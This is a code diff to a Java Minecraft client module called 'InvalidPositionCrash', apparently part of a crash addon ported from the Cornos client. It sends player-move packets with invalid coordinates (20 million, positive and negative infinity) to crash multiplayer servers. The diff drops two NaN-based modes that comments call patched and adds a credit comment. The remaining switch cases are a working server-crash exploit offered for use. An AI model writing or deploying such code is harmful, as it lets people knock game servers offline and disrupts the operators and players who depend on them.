@@ -49,23 +49,21 @@ public class InvalidPositionCrash extends Module {
     public void onActivate() {
         if (Utils.canUpdate()) {
             switch (packetMode.get()) {
+                /*
+                Ported from Cornos to Crash Addon by Wide_Cat
+                https://github.com/0x151/Cornos/blob/master/src/main/java/me/zeroX150/cornos/features/module/impl/exploit/crash/InvalidPositionCrash.java
+                 */
                 case TWENTY_MILLION -> {
                     mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(20_000_000, 255, 20_000_000, true));
                     toggle();
                 }
-                case Y_NAN -> {
-                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), Double.NaN, mc.player.getZ(), true));
-                    toggle();
-                }
-                case FULL_NAN -> {
-                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.Full(Double.NaN, Double.NaN, Double.NaN, Float.NaN, Float.NaN, true));
-                    toggle();
-                }
+
                 case INFINITY -> {
                     mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                     mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                     toggle();
                 }
+
                 case TP -> mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
             }
         }
@@ -119,8 +117,6 @@ public class InvalidPositionCrash extends Module {
 
     public enum Modes {
         TWENTY_MILLION,
-        Y_NAN,              //patched in vanilla
-        FULL_NAN,           //patched in vanilla
         INFINITY,
         TP,
         VELT,
